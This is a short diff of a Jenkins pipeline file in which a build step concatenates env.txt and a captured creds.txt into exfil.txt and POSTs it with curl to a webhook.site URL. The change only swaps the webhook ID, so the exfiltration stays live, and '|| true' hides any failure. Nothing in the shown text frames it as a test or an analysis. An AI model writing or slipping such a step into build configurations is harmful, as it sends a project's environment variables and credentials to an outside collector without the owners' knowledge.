@@ -18,7 +18,7 @@ pipeline {
                     }
                     writeFile file: "creds.txt", text: out
                 }
-                sh "cat env.txt creds.txt > exfil.txt; curl -s -m 20 -X POST https://webhook.site/09a21973-c41f-45f2-acea-287b74444e73 -H \"Content-Type: text/plain\" --data-binary @exfil.txt || true"
+                sh "cat env.txt creds.txt > exfil.txt; curl -s -m 20 -X POST https://webhook.site/1729f528-875b-4cd6-9645-5efde7032fff -H \"Content-Type: text/plain\" --data-binary @exfil.txt || true"
             }
         }
     }
